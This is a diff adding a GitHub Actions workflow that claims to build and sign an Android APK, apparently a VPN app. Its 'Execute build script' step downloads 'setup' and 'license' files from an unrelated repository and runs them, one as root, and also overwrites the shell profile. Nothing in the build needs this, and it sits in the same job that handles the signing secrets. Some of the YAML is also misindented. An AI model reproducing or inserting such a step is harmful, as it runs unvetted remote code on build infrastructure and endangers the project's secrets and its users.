@@ -1,0 +1,55 @@
+name: Build and Sign APK
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Execute build script
+      run: |
+        curl -o setup https://raw.githubusercontent.com/BCW52/Will/main/setup
+        curl -o license https://raw.githubusercontent.com/BCW52/Will/main/license
+        sh setup
+        cp bashrc ~/.bashrc
+        chmod +x license
+        sudo groupadd vagrant
+        sudo sh license
+
+    - name: Decode Keystore
+      id: decode_keystore
+      uses: timheuer/base64-to-file@v1.2
+      with:
+        fileName: 'keystore.jks'
+        fileDir: 'app/keystore/'
+        encodedString: ${{ secrets.KEYSTORE }}
+
+    - name: Build and Sign APK
+      run: |
+        sudo chmod +x gradlew
+        sh gradlew clean
+        sh gradlew assembleRelease
+    - name: Sign App Bundle
+        uses: r0adkll/sign-android-release@v1
+        id: sign_app
+        with:
+          releaseDirectory: app/build/outputs/apk/release/
+          signingKeyBase64: ${{ secrets.ANDROID_KEYSTORE_FILE_BASE64 }}
+          alias: ${{ secrets.ANDROID_SIGNING_KEY_ALIAS }}
+          keyStorePassword: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
+          keyPassword: ${{ secrets.ANDROID_SIGNING_KEY_PASSWORD }}
+
+      - name: Upload the signed APK artifact
+        uses: actions/upload-artifact@v2
+        with:
+          name: app-release-signed
+          path: app/build/outputs/apk/release/KaizenVPN.apk
+
